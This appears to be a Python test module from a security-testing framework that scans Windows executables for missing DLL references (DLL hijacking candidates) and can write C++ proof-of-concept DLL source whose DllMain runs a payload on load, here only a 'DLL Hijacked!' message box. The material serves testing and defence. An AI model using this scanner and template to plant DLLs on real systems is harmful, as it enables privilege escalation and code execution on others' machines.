import os
import subprocess
import platform
from datetime import datetime
from typing import Dict, List
from executor.BaseTest import BaseTest


class GhostDLLTest(BaseTest):
    TEST_NAME = "ghost_dll"
    CATEGORY = "privilege-escalation"

    DEFAULT_SEARCH_PATHS: List[str] = [
        r"C:\\Windows\\System32",
        r"C:\\Windows\\SysWOW64",
        r"C:\\Program Files",
        r"C:\\Program Files (x86)"
    ]

    def run(self, config: Dict) -> Dict:
        cfg = {**self.load_config(), **config}
        search_paths = cfg.get("search_paths", self.DEFAULT_SEARCH_PATHS)
        save_dlls = bool(cfg.get("save_dlls", False))
        output_dir = cfg.get(
            "output_dir",
            os.path.join(os.getcwd(), 'output', 'dll_hijack')
        )

        @self.log_command(name="Ensure output directory")
        def ensure_dirs():
            start = datetime.utcnow().isoformat()
            os.makedirs(output_dir, exist_ok=True)
            end = datetime.utcnow().isoformat()
            return {
                "stdout": output_dir,
                "stderr": "",
                "return_code": 0,
                "start": start,
                "end": end,
                "duration": 0
            }
        ensure_dirs()

        @self.log_command(name="Check strings utility")
        def check_strings():
            start = datetime.utcnow().isoformat()
            proc = subprocess.run([
                "strings", "--version"
            ], capture_output=True, text=True)
            end = datetime.utcnow().isoformat()
            return {
                "stdout": "",  # prevent bloating output
                "stderr": proc.stderr,
                "return_code": proc.returncode,
                "start": start,
                "end": end,
                "duration": 0
            }
        str_res = check_strings()
        if str_res["return_code"] != 0:
            return self._fail_test("'strings' utility not available")

        found = []

        for path in search_paths:
            @self.log_command(name=f"Check path exists: {path}")
            def check_path():
                start = datetime.utcnow().isoformat()
                exists = os.path.exists(path)
                end = datetime.utcnow().isoformat()
                return {
                    "stdout": f"{path} exists" if exists else "",
                    "stderr": "" if exists else f"{path} not found",
                    "return_code": 0 if exists else 1,
                    "start": start,
                    "end": end,
                    "duration": 0
                }
            path_res = check_path()
            if path_res["return_code"] != 0:
                continue

            for root, _, files in os.walk(path):
                for fname in files:
                    if not fname.lower().endswith('.exe'):
                        continue
                    exe_path = os.path.join(root, fname)

                    def dump_strings():
                        start = datetime.utcnow().isoformat()
                        proc = subprocess.run(
                            ["strings", exe_path],
                            capture_output=True, text=True
                        )
                        end = datetime.utcnow().isoformat()
                        return {
                            "stdout": proc.stdout,
                            "stderr": proc.stderr,
                            "return_code": proc.returncode,
                            "start": start,
                            "end": end,
                            "duration": 0
                        }
                    dump_res = dump_strings()
                    if dump_res["return_code"] != 0:
                        continue

                    for line in dump_res["stdout"].splitlines():
                        if not line.lower().endswith('.dll'):
                            continue
                        exists_any = any(
                            os.path.exists(os.path.join(p, line))
                            for p in search_paths
                        )
                        if not exists_any:
                            found.append((exe_path, line))

                            @self.log_command(name=f"Missing DLL detected: {line}")
                            def detect():
                                start = datetime.utcnow().isoformat()
                                msg = f"{exe_path} loads missing DLL: {line}"
                                end = datetime.utcnow().isoformat()
                                return {
                                    "stdout": msg,
                                    "stderr": "",
                                    "return_code": 0,
                                    "start": start,
                                    "end": end,
                                    "duration": 0
                                }
                            detect()

                            if save_dlls:
                                @self.log_command(name=f"Generate malicious DLL: {line}")
                                def gen():
                                    start = datetime.utcnow().isoformat()
                                    try:
                                        cpp = os.path.join(output_dir, f"{line}.cpp")
                                        code = f"""
#include <windows.h>
extern "C" __declspec(dllexport) void Payload() {{
    MessageBox(NULL, \"DLL Hijacked!\", \"{line}\", MB_OK);
}}
BOOL APIENTRY DllMain(HMODULE m, DWORD r, LPVOID lp) {{
    if (r == DLL_PROCESS_ATTACH) Payload();
    return TRUE;
}}
"""
                                        with open(cpp, 'w') as f:
                                            f.write(code)
                                        end = datetime.utcnow().isoformat()
                                        return {
                                            "stdout": cpp,
                                            "stderr": "",
                                            "return_code": 0,
                                            "start": start,
                                            "end": end,
                                            "duration": 0
                                        }
                                    except Exception as e:
                                        end = datetime.utcnow().isoformat()
                                        return {
                                            "stdout": "",
                                            "stderr": str(e),
                                            "return_code": 1,
                                            "start": start,
                                            "end": end,
                                            "duration": 0
                                        }
                                gen()

        status = "success" if found else "failure"
        comment = f"Detected {len(found)} missing DLL load(s)"
        result = {
            "status": status,
            "executed_command": "ghost_dll_scan",
            "comment": comment,
            "dest_ip": None,
            "dest_port": None,
        }
        self.log_result(result)
        return result

    def _fail_test(self, message: str) -> Dict:
        return {
            "status": "error",
            "executed_command": "ghost_dll_scan",
            "comment": message,
            "dest_ip": None,
            "dest_port": None,
        }
